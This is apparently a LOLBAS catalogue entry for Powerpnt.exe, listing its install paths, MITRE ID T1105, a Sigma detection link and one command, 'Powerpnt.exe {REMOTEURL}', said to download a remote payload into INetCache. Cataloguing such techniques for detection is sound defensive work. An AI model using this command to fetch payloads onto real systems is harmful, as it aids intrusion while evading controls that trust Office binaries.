---
Acknowledgement:
- Person: Reegun J (OCBC Ba
Author: Reegun J (OCBC Bank)
Commands:
- Category: Download
  Command: Powerpnt.exe {REMOTEURL}
  Description: Downloads payload from remote server
  MitreID: T1105
  OperatingSystem: Windows
  Privileges: User
  Tags:
  - Download: INetCache
  Usecase: It will download a remote payload and place it in INetCache.
Created: 2019-07-19
Description: Microsoft Office binary.
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_lolbin_office.yml
- IOC: Suspicious Office application Internet/network traffic
Full_Path:
- Path: C:\Program Files (x86)\Microsoft Office 16\ClientX86\Root\Office16\Powerpnt.exe
- Path: C:\Program Files\Microsoft Office 16\ClientX64\Root\Office16\Powerpnt.exe
- Path: C:\Program Files (x86)\Microsoft Office\Office16\Powerpnt.exe
- Path: C:\Program Files\Microsoft Office\Office16\Powerpnt.exe
- Path: C:\Program Files (x86)\Microsoft Office 15\ClientX86\Root\Office15\Powerpnt.exe
- Path: C:\Program Files\Microsoft Office 15\ClientX64\Root\Office15\Powerpnt.exe
- Path: C:\Program Files (x86)\Microsoft Office\Office15\Powerpnt.exe
- Path: C:\Program Files\Microsoft Office\Office15\Powerpnt.exe
- Path: C:\Program Files (x86)\Microsoft Office 14\ClientX86\Root\Office14\Powerpnt.exe
- Path: C:\Program Files\Microsoft Office 14\ClientX64\Root\Office14\Powerpnt.exe
- Path: C:\Program Files (x86)\Microsoft Office\Office14\Powerpnt.exe
- Path: C:\Program Files\Microsoft Office\Office14\Powerpnt.exe
- Path: C:\Program Files (x86)\Microsoft Office\Office12\Powerpnt.exe
- Path: C:\Program Files\Microsoft Office\Office12\Powerpnt.exe
- Path: C:\Program Files\Microsoft Office\Office12\Powerpnt.exe
Name: Powerpnt.exe
Resources:
- Link: https://twitter.com/reegun21/status/1150032506504151040
- Link: https://medium.com/@reegun/unsanitized-file-validation-leads-to-malicious-payload-download-via-office-binaries-202d02db7191
mitre_data:
  technique_ids:
  - T1105
tags:
- lolbas/othermsbinaries
---

# Powerpnt.exe

Microsoft Office binary.

# Path(s)

- `C:\Program Files (x86)\Microsoft Office 16\ClientX86\Root\Office16\Powerpnt.exe`
- `C:\Program Files\Microsoft Office 16\ClientX64\Root\Office16\Powerpnt.exe`
- `C:\Program Files (x86)\Microsoft Office\Office16\Powerpnt.exe`
- `C:\Program Files\Microsoft Office\Office16\Powerpnt.exe`
- `C:\Program Files (x86)\Microsoft Office 15\ClientX86\Root\Office15\Powerpnt.exe`
- `C:\Program Files\Microsoft Office 15\ClientX64\Root\Office15\Powerpnt.exe`
- `C:\Program Files (x86)\Microsoft Office\Office15\Powerpnt.exe`
- `C:\Program Files\Microsoft Office\Office15\Powerpnt.exe`
- `C:\Program Files (x86)\Microsoft Office 14\ClientX86\Root\Office14\Powerpnt.exe`
- `C:\Program Files\Microsoft Office 14\ClientX64\Root\Office14\Powerpnt.exe`
- `C:\Program Files (x86)\Microsoft Office\Office14\Powerpnt.exe`
- `C:\Program Files\Microsoft Office\Office14\Powerpnt.exe`
- `C:\Program Files (x86)\Microsoft Office\Office12\Powerpnt.exe`
- `C:\Program Files\Microsoft Office\Office12\Powerpnt.exe`
- `C:\Program Files\Microsoft Office\Office12\Powerpnt.exe`

# Download Commands

Downloads payload from remote server

```batch
Powerpnt.exe {REMOTEURL}
```

- **Usecase:** It will download a remote payload and place it in INetCache.
- **Privileges Required:** User
- **MitreID:** `T1105`
- **Operating System(s):** Windows



# Resource(s)

- https://twitter.com/reegun21/status/1150032506504151040
- https://medium.com/@reegun/unsanitized-file-validation-leads-to-malicious-payload-download-via-office-binaries-202d02db7191
# Acknowledgements

- Reegun J (OCBC Bank) (Authored, 2019-07-19)
- Reegun J (OCBC Ba